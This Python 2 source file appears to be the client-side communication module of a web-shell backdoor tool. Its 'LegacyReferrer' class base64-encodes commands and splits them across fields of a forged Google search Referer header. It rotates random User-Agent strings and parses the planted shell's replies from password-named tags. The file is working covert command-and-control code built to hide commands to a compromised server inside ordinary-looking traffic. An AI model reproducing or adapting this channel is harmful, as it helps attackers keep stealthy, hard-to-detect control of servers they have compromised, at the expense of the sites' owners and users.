from core.loggers import dlog
import re
import urlparse
import random
import utils
import string
import base64
import urllib2

class LegacyReferrer:

    def __init__(self, url, password):

        self.url = url
        self.password = password
        self.extractor = re.compile(
            "<%s>(.*)</%s>" % (
                self.password[2:],
                self.password[2:]
            ),
            re.DOTALL
        )

        self.parsed = urlparse.urlparse(self.url)
        self.data = None

        if not self.parsed.path:
            self.query = self.parsed.netloc.replace('/', ' ')
        else:
            self.query = ''.join(
                    self.parsed.path.split('.')[:-1]
                ).replace('/', ' ')

        # Load agents
        self.agents = utils.http.load_all_agents()

    def send(self, original_payload):

        payload = base64.b64encode(original_payload.strip())
        length = len(payload)
        third = length / 3
        thirds = third * 2

        referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % (
            self.password[:2],
            urllib2.quote(self.url),
            self.query.strip(),
            payload[:third],
            payload[ third:thirds],
            payload[thirds:]
        )

        opener = urllib2.build_opener()

        opener.addheaders = [
            ('User-Agent', random.choice(self.agents)),
            ('Referer', referer),
        ]

        dlog.debug(
            '[R] %s' %
            (referer)
        )

        response = opener.open(self.url).read()

        if not response:
            return

        data = self.extractor.findall(response)

        if not data or len(data) < 1:
            return

        return data[0].strip()
